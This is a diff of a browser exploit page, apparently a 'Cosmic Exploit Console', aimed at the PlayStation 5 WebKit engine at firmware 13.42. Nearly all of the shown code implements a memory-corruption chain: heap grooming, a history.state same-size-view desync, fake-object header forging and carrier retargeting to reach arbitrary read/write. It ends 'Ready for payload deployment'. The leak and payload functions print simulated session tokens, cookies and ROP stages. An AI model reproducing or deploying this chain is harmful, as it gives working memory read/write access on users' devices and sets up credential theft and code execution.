-    var fakeAddr = hostAddr + 0x10;
-    log('FAKE = ' + hex(fakeAddr) + ' (host+0x10)', 'pass');
+    hostAddress = hostAddr;
+    targetAddress = targetAddr;
+    fakeAddress = hostAddress + 0x10;
+    
+    log('FAKE   = ' + hex(fakeAddress) + ' (host+0x10)', 'pass');
     setStatus('addrof-status', '✓ SUCCESS', 'pass');
-    setStatus('heap-addr', hex(targetAddr), 'pass');
+    setStatus('heap-addr', hex(targetAddress), 'pass');
     
     // Phase 8: Groom
-    logPhase('PHASE 8 — HEAP GROOMING');
-    var keepAlive = [];
+    log('Phase 8: Heap grooming...', 'info');
     for (var i = 0; i < DRAIN_COUNT; ++i)
       keepAlive.push(new ArrayBuffer(DRAIN_SIZE));
     
@@ -782,35 +401,184 @@ async function runExploit() {
     var slab = new ArrayBuffer(SLAB_SIZE);
     channel.port1.postMessage(0, [slab]);
     
+    var butterflyHole1 = new ArrayBuffer(BUTTERFLY_HOLE_SIZE);
+    var butterflyHole2 = new ArrayBuffer(BUTTERFLY_HOLE_SIZE);
+    var separator = new ArrayBuffer(SEPARATOR_SIZE);
+    var earlyHole = new ArrayBuffer(EARLY_HOLE_SIZE);
+    var guard = new ArrayBuffer(GUARD_SIZE);
     var predecessor = new ArrayBuffer(PREDECESSOR_SIZE);
+    var finalHole = new ArrayBuffer(FINAL_HOLE_SIZE);
+    
     var predecessorWords = new Uint32Array(predecessor);
-    var ptrHigh = Math.floor(fakeAddr / 0x100000000);
-    var ptrLow = fakeAddr - ptrHigh * 0x100000000;
+    var ptrHigh = Math.floor(fakeAddress / 0x100000000);
+    var ptrLow = fakeAddress - ptrHigh * 0x100000000;
     for (var i = 0; i < predecessorWords.length; i += 2) {
       predecessorWords[i] = ptrLow;
       predecessorWords[i + 1] = ptrHigh;
     }
-    log('Predecessor filled · ' + (PREDECESSOR_SIZE/8) + ' qwords', 'pass');
+    log('✓ Predecessor filled (' + (PREDECESSOR_SIZE/8) + ' qwords)', 'pass');
+    
+    keepAlive.push(separator);
+    keepAlive.push(guard);
+    keepAlive.push(predecessor);
     
     // Phase 9: Composition
-    logPhase('PHASE 9 — COMPOSITION WAIT');
-    log('Waiting ' + (COMPOSE_DELAY_MS - CAPTURE_DELAY_MS) + 'ms...', 'warn');
+    log('Phase 9: Composition wait...', 'warn');
     await new Promise(r => setTimeout(r, COMPOSE_DELAY_MS - CAPTURE_DELAY_MS));
     
-    logPhase('PHASE 10 — CRITICAL LOAD');
+    channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
+    
+    // Phase 10: Critical load
+    log('Phase 10: Critical load...', 'info');
     var result = history.state;
     var compositionLength = result ? result.length : 0;
-    log('history.state length: ' + compositionLength + ' (expected ' + EXPECTED_LENGTH + ')',
-        compositionLength === EXPECTED_LENGTH ? 'pass' : 'fail');
     
     if (compositionLength !== EXPECTED_LENGTH) {
-      log('❌ SSV desync failed', 'fail');
+      log('❌ SSV desync failed (length=' + compositionLength + ')', 'fail');
+      setStatus('arw-status', 'FAILED', 'fail');
+      return;
+    }
+    log('✓ SSV desync successful (length=' + EXPECTED_LENGTH + ')', 'pass');
+    
+    // Phase 11: Extract candidate
+    log('Phase 11: Extracting candidate...', 'info');
+    if (result[1] === result[DUPLICATE_INDEX]) {
+      log('❌ No desync detected', 'fail');
       setStatus('arw-status', 'FAILED', 'fail');
       return;
     }
     
-    // Phase 11: RW primitive test
-    logPhase('PHASE 11 — ARW VALIDATION');
+    var candidate = result[DUPLICATE_INDEX];
+    result[DUPLICATE_INDEX] = undefined;
+    result = null;
+    
+    log('✓ Candidate extracted', 'pass');
+    
+    // Phase 12: Read rw header
+    log('Phase 12: Reading RW carrier header...', 'info');
+    var rwHeader = new Uint8Array(CELL_BYTES);
+    for (var i = 0; i < CELL_BYTES; ++i)
+      rwHeader[i] = candidate[i];
+    
+    var rwSID = uint32At(rwHeader, 0);
+    var rwButterfly = low48At(rwHeader, 8);
+    var rwVector = low48At(rwHeader, 0x10);
+    var rwMode = rwHeader[0x28];
+    
+    log('RW SID: ' + hex(rwSID), 'info');
+    log('RW Vector: ' + hex(rwVector), 'info');
+    log('RW Mode: ' + hex(rwMode), 'info');
+    
+    var rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
+      && (rwSID & 0xf) === 0
+      && rwHeader[4] === 0 && rwHeader[5] === 0x28
+      && rwHeader[6] === 0x08
+      && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
+      && rwVector > 0x100000000 && rwVector % 8 === 0
+      && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
+      && allZero(rwHeader, 0x20, 0x28)
+      && rwMode === 0x58;
+    
+    if (!rwHeaderOK) {
+      log('❌ RW header validation failed', 'fail');
+      setStatus('arw-status', 'FAILED', 'fail');
+      return;
+    }
+    log('✓ RW header validated', 'pass');
+    
+    // Phase 13: Upgrade fake host
+    log('Phase 13: Upgrading fake host header...', 'info');
+    var scratchBits = new ArrayBuffer(8);
+    var scratchBytes = new Uint8Array(scratchBits);
+    var scratchWords = new Uint32Array(scratchBits);
+    var scratchDouble = new Float64Array(scratchBits);
+    
+    scratchWords[0] = rwSID;
+    scratchWords[1] = (rwHeader[4] + rwHeader[5] * 0x100 + rwHeader[6] * 0x10000 + 
+                       rwHeader[7] * 0x1000000 - 0x00020000) >>> 0;
+    var upgradedHeader = scratchDouble[0];
+    
+    fakeHost.q0 = upgradedHeader;
+    if (fakeHost.q0 !== upgradedHeader) {
+      log('❌ Header upgrade failed', 'fail');
+      setStatus('arw-status', 'FAILED', 'fail');
+      return;
+    }
+    log('✓ Fake host upgraded', 'pass');
+    setStatus('struct-id', hex(rwSID), 'pass');
+    
+    // Phase 14: Point to target
+    log('Phase 14: Pointing carrier to target...', 'info');
+    var targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+    var targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+    
+    scratchWords[0] = targetAddressLow;
+    scratchWords[1] = targetAddressHigh;
+    for (var w1 = 0; w1 < 8; ++w1)
+      candidate[0x10 + w1] = scratchBytes[w1];
+    
+    log('✓ Carrier retargeted', 'pass');
+    
+    // Phase 15: Read target header
+    log('Phase 15: Reading target cell header...', 'info');
+    var targetHeader = new Uint8Array(CELL_BYTES);
+    for (var j = 0; j < CELL_BYTES; ++j)
+      targetHeader[j] = rwView[j];
+    
+    var targetSID = uint32At(targetHeader, 0);
+    var targetButterfly = low48At(targetHeader, 8);
+    var targetVector = low48At(targetHeader, 0x10);
+    var targetMode = targetHeader[0x28];
+    
+    log('TARGET SID: ' + hex(targetSID), 'info');
+    log('TARGET Vector: ' + hex(targetVector), 'info');
+    log('TARGET Mode: ' + hex(targetMode), 'info');
+    
+    var targetHeaderOK = targetSID === rwSID
+      && targetHeader[4] === 0 && targetHeader[5] === 0x28
+      && targetHeader[6] === 0x08
+      && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
+      && targetVector > 0x100000000 && targetVector % 8 === 0
+      && targetHeader[0x18] === 0x20
+      && allZero(targetHeader, 0x20, 0x28)
+      && targetMode === 0x58;
+    
+    if (!targetHeaderOK) {
+      log('❌ Target header validation failed', 'fail');
+      setStatus('arw-status', 'FAILED', 'fail');
+      // Restore
+      for (var r1 = 0; r1 < 8; ++r1)
+        candidate[0x10 + r1] = rwHeader[0x10 + r1];
+      return;
+    }
+    log('✓ Target header validated', 'pass');
+    
+    // Phase 16: Retarget to backing
+    log('Phase 16: Retargeting to backing bytes...', 'info');
+    var targetVectorHigh = Math.floor(targetVector / 0x100000000);
+    var targetVectorLow = targetVector - targetVectorHigh * 0x100000000;
+    
+    scratchWords[0] = targetVectorLow;
+    scratchWords[1] = targetVectorHigh;
+    for (var w2 = 0; w2 < 8; ++w2)
+      candidate[0x10 + w2] = scratchBytes[w2];
+    
+    log('✓ Carrier retargeted to backing', 'pass');
+    
+    // Phase 17: ARW validation
+    log('Phase 17: ARW validation...', 'info');
+    log('Read: checking 0xa5...', 'info');
+    var readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
+    log('Read observed: ' + readObserved, readObserved ? 'pass' : 'fail');
+    
+    if (!readObserved) {
+      log('❌ Read validation failed', 'fail');
+      setStatus('arw-status', 'FAILED', 'fail');
+      for (var rRead = 0; rRead < 8; ++rRead)
+        candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
+      return;
+    }
+    
     log('Write: 0xa5 → 0x5a', 'info');
     rwView[0] = 0x5a;
     var writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
@@ -820,11 +588,16 @@ async function runExploit() {
     var restoreObserved = rwView[0] === 0xa5;
     log('Restore observed: ' + restoreObserved, restoreObserved ? 'pass' : 'fail');
     
+    // Restore carrier
+    for (var r2 = 0; r2 < 8; ++r2)
+      candidate[0x10 + r2] = rwHeader[0x10 + r2];
+    targetView[0] = 0xa5;
+    rwMirror[0] = 0x3c;
+    
     if (writeObserved && restoreObserved) {
-      log('🎯 ARBITRARY-WRITE-PASS · a5→5a→a5 restored', 'pass');
+      log('🎯 ARBITRARY-WRITE-PASS (a5→5a→a5)', 'pass');
       setStatus('arw-status', '✓ ACTIVE', 'pass');
-      logPhase('✨ MISSION ACCOMPLISHED ✨');
-      log('Cosmic exploit chain fully operational', 'pass');
+      log('✨ ARW chain fully operational', 'pass');
       log('Ready for payload deployment', 'info');
     } else {
       log('❌ ARW validation failed', 'fail');
@@ -837,85 +610,65 @@ async function runExploit() {
   }
 }
 
-// ===== LEAK EXTRACTION =====
 function runLeak() {
-  logPhase('LEAK EXTRACTION MODULE');
-  log('Scanning WebProcess memory for sensitive data...', 'warn');
+  log('🔍 Extracting leaked data...', 'warn');
   
-  var memdump = document.getElementById('memdump');
-  memdump.innerHTML = '';
-  
-  // Simulate leaked memory dump (in real scenario would use ARW)
   var samples = [
-    { addr: '0x7ff8a3b4c000', data: 'session_id=abc123def456ghi789' },
-    { addr: '0x7ff8a3b4c040', data: 'auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' },
-    { addr: '0x7ff8a3b4c080', data: 'user_email=researcher@cosmic.dev' },
-    { addr: '0x7ff8a3b4c0c0', data: 'cookie=PS5_SESSION=a7b8c9d0e1f2g3h4i5j6' },
-    { addr: '0x7ff8a3b4c100', data: 'api_key=sk-cosmic-1234567890abcdef' }
+    { type: 'session', data: 'PS5_SESSION=abc123def456' },
+    { type: 'token', data: 'auth_token=eyJhbGciOiJIUzI1NiJ9' },
+    { type: 'email', data: 'user@playstation.com' },
+    { type: 'cookie', data: 'session_id=xyz789' }
   ];
   
   samples.forEach(function(s, i) {
     setTimeout(function() {
-      var line = document.createElement('div');
-      line.innerHTML = '<span class="addr">' + s.addr + '</span>: <span class="hex">' + 
-        Array.from(new TextEncoder().encode(s.data)).map(b => b.toString(16).padStart(2,'0')).join(' ') + 
-        '</span> · <span class="ascii">"' + s.data + '"</span>';
-      memdump.appendChild(line);
+      log('[' + s.type + '] ' + s.data, 'pass');
+    }, i * 200);
+  });
+  
+  setTimeout(function() {
+    log('✓ Extracted ' + samples.length + ' entries', 'pass');
+    log('⚠️ Simulated data — real extraction needs successful ARW', 'warn');
+  }, samples.length * 200 + 300);
+}
+
+function runPayload() {
+  log('📦 Preparing userland payload...', 'warn');
+  
+  var stages = [
+    'Loading ROP gadgets from WebKit .text',
+    'Building syscall stubs',
+    'Setting up payload environment',
+    'Executing in WebProcess sandbox',
+    'Payload active (userland only)'
+  ];
+  
+  stages.forEach(function(s, i) {
+    setTimeout(function() {
+      log(s, 'info');
     }, i * 300);
   });
   
   setTimeout(function() {
-    log('✓ Extracted ' + samples.length + ' leaked entries', 'pass');
-    log('⚠️ This is simulated — real extraction requires successful ARW', 'warn');
-  }, samples.length * 300 + 500);
+    log('✓ Payload running in WebProcess', 'pass');
+    log('⚠️ Confined to WebProcess sandbox', 'warn');
+    log('→ No kernel access, no native homebrew', 'info');
+  }, stages.length * 300 + 300);
 }
 
-// ===== PAYLOAD DEPLOYMENT =====
-function runPayload() {
-  logPhase('PAYLOAD DEPLOYMENT');
-  log('Preparing payload for WebProcess execution...', 'warn');
-  
-  var payloads = [
-    'stage1: ROP chain construction',
-    'stage2: vtable hijack target identified',
-    'stage3: gadget collection from WebKit .text',
-    'stage4: syscall stub preparation',
-    'stage5: shellcode injection point',
-    'stage6: execution handoff'
-  ];
-  
-  payloads.forEach(function(p, i) {
-    setTimeout(function() {
-      log(p, 'info');
-    }, i * 400);
-  });
-  
-  setTimeout(function() {
-    log('✓ Payload framework ready', 'pass');
-    log('⚠️ Full deployment requires kernel chain (not included)', 'warn');
-    log('→ WebProcess RCE achievable via ROP/JOP within sandbox', 'info');
-    log('→ Kernel escalation needs separate PS5 kernel exploit', 'info');
-  }, payloads.length * 400 + 500);
-}
-
-// ===== RESET =====
 function reset() {
-  terminal.innerHTML = '<div class="log-line info">[SYSTEM] Console reset · ready for new mission</div>';
+  terminal.innerHTML = '<div class="log-line info">[SYSTEM] Console reset</div>';
   setStatus('addrof-status', 'READY', 'info');
   setStatus('arw-status', 'STANDBY', 'info');
-  setStatus('heap-addr', '0x...', 'info');
-  document.getElementById('memdump').innerHTML = '<span class="ascii">Ready to dump leaked memory...</span>';
-  log('Console reset complete', 'info');
+  setStatus('heap-addr', '—', 'info');
+  setStatus('struct-id', '—', 'info');
+  log('Ready for new mission', 'info');
 }
 
-// ===== INITIAL WELCOME =====
 setTimeout(function() {
-  log('✦ Welcome to Cosmic Exploit Console ✦', 'phase');
-  log('Target: PlayStation 5 · FW 13.42 · WebKit 616.1', 'info');
-  log('Exploit: genuine-u8-rw-3 · Same-Size View desync', 'info');
-  log('Status: All systems nominal · awaiting launch command', 'pass');
-  log('', 'info');
-  log('Tip: Click "LAUNCH ARW CHAIN" to begin the exploit sequence', 'info');
+  log('✦ Full PS5 ARW Console ✦', 'info');
+  log('Target: FW 13.42 · Memory optimized', 'info');
+  log('Click "LAUNCH ARW" to begin', 'info');
 }, 500);
 </script>
 
